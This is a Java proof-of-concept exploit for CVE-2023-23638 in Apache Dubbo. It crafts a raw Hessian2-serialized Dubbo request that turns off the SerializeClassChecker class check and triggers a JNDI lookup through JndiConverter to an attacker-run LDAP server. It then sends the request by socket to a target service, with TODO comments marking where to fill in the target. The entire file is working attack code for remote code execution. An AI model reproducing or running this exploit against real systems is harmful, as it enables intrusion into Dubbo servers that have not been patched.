package cve;

import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;


public class CVE_2023_23638_1 {
    public static Boolean False = false;
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.21");
        //todo 此处填写Dubbo提供的服务名
        out.writeUTF("com.example.api.DemoService");
        out.writeUTF("");
        out.writeUTF("$invokeAsync");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        getRawReturnPayload(out, "ldap://192.168.26.164:1389/mgpnrr");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("192.168.26.164", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        jndi.put("OPEN_CHECK_CLASS", false);

//        HashMap map = new HashMap();
//        map.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
//        map.put("INSTANCE", jndi);

        HashMap map1 = new HashMap();
        map1.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        map1.put("asText", ldapUri);
//        map1.put("class", "com.sun.rowset.JdbcRowSetImpl");
//        map1.put("dataSourceName", ldapUri);
//        map1.put("autoCommit", "true");

        HashMap map2 = new HashMap();
        map2.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        map2.put("OPEN_CHECK_CLASS", False);
//        map2.put("CLASS_BLOCK_LFU_CACHE", null);
        map2.put("INSTANCE", jndi);
        map2.put("CACHE", map1);
        out.writeObject(new Object[]{map2});

        HashMap map4 = new HashMap();
        map4.put("generic", "raw.return");
        out.writeObject(map4);
    }

}
